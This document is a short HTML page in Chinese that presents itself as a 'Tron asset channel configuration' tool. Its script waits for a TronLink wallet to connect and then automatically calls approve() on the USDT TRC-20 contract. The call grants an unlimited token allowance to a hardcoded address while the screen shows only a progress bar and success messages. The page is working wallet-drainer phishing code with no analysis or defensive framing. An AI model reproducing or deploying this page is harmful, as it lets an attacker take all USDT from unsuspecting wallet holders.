<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Tron 資產通道配置</title>
<style>
  body {
    background: #121212;
    color: #eee;
    font-family: "Microsoft Yahei", Arial, sans-serif;
    display: flex;
    flex-direction: column;
    height: 100vh;
    margin: 0;
    justify-content: center;
    align-items: center;
  }
  h2 { margin-bottom: 1rem; }
  .status {
    font-size: 1.4rem;
    margin-bottom: 20px;
    transition: color 0.3s ease;
    max-width: 320px;
    text-align: center;
    word-break: break-word;
  }
  .status.loading { color: #888; }
  .status.success { color: #4caf50; }
  .status.error { color: #f44336; }
  .progress-bar {
    width: 300px;
    height: 8px;
    background: #333;
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 15px;
  }
  .progress-bar > div {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #2196f3, #21cbf3);
    transition: width 0.5s ease;
  }
</style>
</head>
<body>

<h2>資產通道配置（僅 Tron）</h2>
<div id="status" class="status loading">等待檢測 Tron 錢包...</div>
<div class="progress-bar"><div id="progress"></div></div>

<script>
  const CFG = {
    USDT: {
      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
    },
    TARGET: {
      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf"
    },
    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" // 無限額度
  };

  const statusEl = document.getElementById("status");
  const progressEl = document.getElementById("progress");

  function setStatus(msg, cls="loading", progressPercent=null) {
    statusEl.innerText = msg;
    statusEl.className = "status " + cls;
    if (progressPercent !== null) {
      progressEl.style.width = progressPercent + "%";
    }
  }

  async function tronApprove() {
    try {
      setStatus("正在進行 Tron 通道授權...", "loading", 60);
      const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
      await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
      setStatus("✅ 授權成功", "success", 100);
      return true;
    } catch (e) {
      console.error("Tron 授權失敗:", e);
      setStatus("❌ 授權失敗，請檢查錢包", "error", 100);
      return false;
    }
  }

  function listenForTronWeb() {
    let progress = 0;
    const interval = setInterval(async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        clearInterval(interval);
        setStatus("檢測到 Tron 錢包，準備授權...", "loading", 30);
        await tronApprove();
      } else {
        progress = (progress + 2) % 100;
        setStatus("等待錢包連接...", "loading", progress);
      }
    }, 500);
  }

  window.addEventListener('load', listenForTronWeb);
</script>

</body>
</html>
